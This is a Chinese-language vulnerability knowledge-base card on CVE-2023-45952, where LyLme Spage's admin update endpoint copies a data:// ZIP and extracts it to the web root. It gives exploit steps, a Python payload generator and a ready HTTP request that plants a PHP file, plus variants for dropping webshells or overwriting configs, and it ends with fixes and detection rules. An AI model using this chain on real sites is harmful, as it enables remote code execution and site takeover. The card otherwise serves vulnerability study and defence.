---
id: web-generic-file-upload-lylme-update-data-wrapper-zip-rce
title: LyLme Spage 后台更新 copy()+zipExtract 用 data:// 伪协议投递内存 ZIP：无需上传点解压到站点根 GetShell（CVE-2023-45952）
type: scenario
domain: web
path: web/generic/file-upload
technique: php-data-wrapper-copy-zip-extract-rce
tags:
- web
- php
- file-upload
- zip
- data-wrapper
- rce
- code-audit
cve:
- CVE-2023-45952
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: v1.7.0
verification:
  verified_by: verifier-V642
  verified_at: '2026-11-13T02:25:55+08:00'
  notes: 已对照原文 12565 全文与 55 张图核对：admin/ajax_link.php?submit=update 的 RemoteFile=$_POST['file']、copy 到 lylme_spage-update.zip、zipExtract(ROOT)、data://text/plain;base64 投递、success 响应与 1.php phpinfo 落地均与截图 25/26/27/28 一致；PoC base64 与原文字节一致；CVE-2023-45952/v1.7.0 与 NVD 截图一致。与既有卡 web-generic-file-upload-lylme-update-zip-extract-rce 同 sink 但投递路径不同（无上传点，data:// 直接喂 copy），append_scenario 理由成立，保留。未实测目标环境。
url: /docs/web/generic/file-upload/web-generic-file-upload-lylme-update-data-wrapper-zip-rce/
draft: false
kb_aliases:
- LyLme Spage 无文件 GetShell
- data:// 伪协议投递 ZIP
- ajax_link.php 任意解压
- CVE-2023-45952
- 解压 GetShell
- lylme_spage-update.zip
---

## 一句话结论

LyLme Spage 后台更新接口 `admin/ajax_link.php?submit=update` 把 `$_POST['file']` 直接 `copy()` 为 `lylme_spage-update.zip`，再 `zipExtract($ZipFile, ROOT)` 解压到站点根目录；由于 PHP 的 `copy()` 支持流封装协议，攻击者无需任何上传点，用 `data://text/plain;base64,<内存中构造的 zip>` 即可「无落地文件」投递更新包，包内的 `1.php` 解压后落在 Web 根直接执行（CVE-2023-45952）。接口位于后台 `$islogin` 鉴权之后，配合 `Client-Ip` SQL 注入读出的明文管理员口令登录后即可完成整链。

## 原理

- 后台更新逻辑（`admin/ajax_link.php`，`switch($submit)` 的 `update` 分支）：
  ```php
  $RemoteFile = $_POST['file'];
  $ZipFile = "lylme_spage-update.zip";
  copy($RemoteFile, $ZipFile) or die("无从更新服务器下载更新包文件！");
  if (zipExtract($ZipFile, ROOT)) {
      if ($admin_path != 'admin' && is_dir(ROOT.'admin')) { ... rename ... }
      unlink($ZipFile);
      exit('success');
  } else {
      unlink($ZipFile);
      exit('无法解压文件！请手动下载更新包解压');
  }
  ```
  `$_POST['file']` 无来源/路径校验，`zipExtract()` 用 `ZipArchive::extractTo($dest)` 把包内容原样解压到 `ROOT`。
- 为什么 `data://` 成立：PHP 的 `copy()` 是流函数（`php_stream_copy_to_stream`），对源路径调用 `php_stream_open_wrapper`，支持 `file://`、`http://`、`ftp://`、`php://`、`data://` 等封装协议；`data://text/plain;base64,...` 直接把请求体中的 base64 解码成字节流，`copy()` 把它写成服务器上的 `lylme_spage-update.zip`。因此不需要目标站点存在上传接口、不需要可写目录先落包，只需一个能访问的 URL 形态字符串（默认 `allow_url_fopen=On`，`data://` 随即可用）。
- 为什么能 GetShell：`zipExtract` 把压缩包解压到站点根 `ROOT`，包内根目录的 `1.php`（内容如 `<?php phpinfo();?>`）即落在 Web 根；`exit('success')` 返回后直接访问 `/1.php` 即执行。zip 条目名可控，还可覆盖已有文件（配置、入口）。
- 鉴权前提：`admin/ajax_link.php` 顶部检查 `isset($islogin)==1`，否则跳转 `login.php`；`$islogin` 来自 `include/member.php` 对 `admin_token` Cookie 的校验，因此需要先取得后台会话——原文用同文章的前台 SQL 注入读出 `lylme_config` 明文 `admin_user/admin_pwd` 后登录取得。
- 全自动链：SQL 注入拿口令 → 登录 `/admin/login.php` 取 `admin_token` → POST 更新接口投递 `data://` zip → 访问 `/1.php`。

## 触发条件

- 运行存在该代码的 LyLme Spage v1.7.0（原文 CVE-2023-45952 描述标注 v1.7.0）。
- 已取得后台登录态（`admin_token` Cookie），即接口通过 `$islogin` 检查；单独看本漏洞是后台漏洞，整链利用需先有前台 SQL 注入或其它后台入口。
- PHP 配置 `allow_url_fopen=On`（默认开）且 `data://` 未被 `disable_functions`/`open_basedir` 之外的策略禁用；`ZipArchive` 扩展可用。
- 站点根目录 `ROOT` 可写，Web 服务器能解析解压出的 PHP 文件。

## 利用步骤

1. 用 Python 在内存构造 zip：包根目录放入 `1.php`，内容 `<?php phpinfo();?>`（或任意 webshell）。
2. 将 zip 字节做 base64，拼成 `data://text/plain;base64,<base64>`，作为 `file` 参数值。
3. 携带管理员 `admin_token` Cookie，POST `/admin/ajax_link.php?submit=update`，body 为 `file=<data payload>`。
4. 响应 `success` 表示 `copy()` 与解压均成功，`lylme_spage-update.zip` 已被删除。
5. 访问 `http://target/1.php` 确认代码执行。

## PoC

构造 payload（原文给出的 Python 版本）：

```python
import zipfile, io, base64

def get_shell_payload(shell_name="1.php", shell_content="<?php phpinfo();?>"):
    zip_data = io.BytesIO()
    with zipfile.ZipFile(zip_data, 'w', zipfile.ZIP_DEFLATED, False) as zipf:
        zipf.writestr(shell_name, shell_content)
    zip_data.seek(0)
    return "data://text/plain;base64," + base64.b64encode(zip_data.read()).decode()
```

请求（等价于原文抓包；`admin_token` 为先登录所得）：

```http
POST /admin/ajax_link.php?submit=update HTTP/1.1
Host: target
Cookie: admin_token=<authcode 加密串>
Content-Type: application/x-www-form-urlencoded

file=data://text/plain;base64,UEsDBBQAAAAIALMUSFdQg8x9EgAAABIAAAAFAAAAMS5waHCzsS/IKFAA4sy8tHwNTWt7OwBQSwECFAMUAAAACACzFEhXUIPMfRIAAAASAAAABQAAAAAAAAAAAAAAgAEAAAAAMS5waHBQSwUGAAAAAAEAAQAzAAAANQAAAAAA
```

返回 `success` 后访问 `http://target/1.php`，页面输出 PHP 信息即 RCE。

## 变体与关联

- 变体：`file` 也可指向 `http(s)://` 外部 URL、`ftp://` 或内网可达地址，由服务器代为下载压缩包；`data://` 只是无需外部托管的「内存投递」方式。
- 变体：`php://filter/convert.base64-decode/resource=...` 等过滤器组合可在需要时对包内容做变形（本文未使用）。
- 变体：zip 内可放 `.htaccess`、模板、配置文件，解压到 `ROOT` 后可覆盖现有文件而非仅新增 shell；代码里 `$admin_path != 'admin'` 时还会把 `admin` 目录重命名，属于同一更新逻辑的副作用。
- 关联：[[web-generic-file-upload-lylme-update-zip-extract-rce]]——同项目、同 `copy()`+`zipExtract(ROOT)` sink，但那篇经 `include/file.php` 的 MIME 信任上传先落包再以相对路径 `../files/upload/x.jpg` 复制；本卡不经任何上传点，用 `data://` 伪协议把内存 zip 直接喂给 `copy()`，触发路径与 PoC 不同。
- 关联：[[web-php-file-inclusion-data-wrapper-short-tag-rce]]——`data://` 在文件包含场景的用法；本卡是其在流复制/写文件 sink 上的复用。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]、[[web-generic-file-upload-thinkphp-admin-upload-unzip-webshell]]——其它「压缩包解压落 Web 根」的同类链。

## 检测与防御

- 修复：更新接口的 `file` 只允许来自官方更新服务器，使用白名单主机+HTTPS+包签名/哈希校验；禁止 `data://`、`php://`、`file://` 等本机封装协议（`in_array(parse_url($file, PHP_URL_SCHEME), ['http','https'])` 并校验主机）。
- 修复：解压前校验 zip 条目：禁止绝对路径与 `../`，只允许预期目录/文件名白名单；解压到隔离目录后再按白名单搬移，禁止直接解压到 `ROOT`。
- 防御：更新功能加二次确认、操作审计与版本来源日志；Web 根目录对运行用户尽量不可写。
- 检测：POST `admin/ajax_link.php?submit=update` 的 `file` 参数以 `data://`/`php://`/`file://` 等非 http(s) 协议开头；请求体出现大段 base64（`UEsDB` 即 `PK\x03\x04` 的 base64 前缀）；随后根目录新增 PHP 文件并被访问。
